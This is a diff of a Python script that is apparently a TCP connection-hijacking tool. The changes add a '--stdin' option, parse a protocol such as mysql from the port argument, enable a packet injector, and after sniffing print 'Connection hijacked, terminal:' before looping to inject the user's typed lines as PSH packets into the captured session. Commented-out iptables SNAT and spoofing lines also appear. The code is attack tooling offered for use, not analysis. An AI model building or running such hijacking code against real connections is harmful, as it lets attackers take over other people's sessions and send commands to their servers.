@@ -42,8 +42,9 @@ def main():
                         dest="firewall",
                         action='store_false')
 
-    parser.add_argument("-w", "--write", help="create a pcap file.", required=False, action='store_true')
-    parser.add_argument("iface", help="")
+    parser.add_argument("-w", "--write", help="create a pcap file.", required=False, default="")
+    parser.add_argument("-s", "--stdin", help="try to execute a terminal protocol.", required=False, default=False, action='store_true')
+    parser.add_argument("iface", help="Set interface listening to")
     parser.add_argument("src", help="Source ip")
     parser.add_argument("dst", help="Destination ip")
     parser.add_argument("port", help="Destination port")
@@ -64,6 +65,8 @@ def main():
     mac_reg = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
     port_reg = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')
 
+    [proto, port] = args.port.split(':')
+
     if os.geteuid() != 0:
         print("this program should be run as root.")
         exit()
@@ -75,7 +78,7 @@ def main():
     elif not ip_reg.match(args.dst):
         print("Invalid destination ip address!")
         exit()
-    elif not port_reg.match(args.port):
+    elif not port_reg.match(port):
         print("Invalid target port!")
         exit()
     
@@ -107,14 +110,13 @@ def main():
         #os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #spoofer.start(settings.ip, settings.src, settings.dst)
-    #injector.init()
-    sniffer.start(settings.src, settings.dst, settings.port)
-    if sniffer.inject_packet is None:
+    injector.init("mysql" if len(proto) == 0 else proto)
+    sniffer.start(settings.src, settings.dst, settings.port, settings.iface, args.write)
+    if sniffer.settings.injected is False:
         print("Failed to get a packet sample.")
         exit()
     print("Connection hijacked, terminal:")
-    packet.receive()
-    while True:
+    while args.stdin:
         payload = sys.stdin.readline()
         ready = packet.create_psh(payload)
         packet.send(ready)
